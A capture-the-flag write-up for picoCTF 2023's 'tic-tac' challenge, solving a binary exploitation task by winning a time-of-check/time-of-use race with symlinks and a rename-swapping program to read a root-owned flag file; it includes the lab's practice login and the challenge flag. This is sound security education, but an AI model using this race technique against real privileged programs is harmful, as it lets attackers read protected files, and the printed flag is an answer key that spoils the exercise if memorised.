# picoCTF 2023 - tic-tac (Binary Exploitation)

## Description  

Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.

ssh to saturn.picoctf.net:59853, and run the binary named "txtreader" once connected. Login as ctf-player with the password, fd7746b4 

## Solution 

Please refer to [this video](https://www.youtube.com/watch?v=5g137gsB9Wk). 

We first create a file that will constantly swap two file. 
I used a piece of code written by stephenR [here](https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c). 

Then, create a symlink to the flag file and a dummy file. 

```bash 
ln -s fake flag.txt
touch file
```

Then, compile and run the code that will swap the name of the file 

```bash 
gcc rename.c -o rename
./rename fake file.txt
```

On a different terminal, run 
```bash 
./txtreader fake
```

This might not work the first time, but keep trying and you will get the flag.

## Flag 

`picoCTF{ToctoU_!s_3a5y_a5726c65}`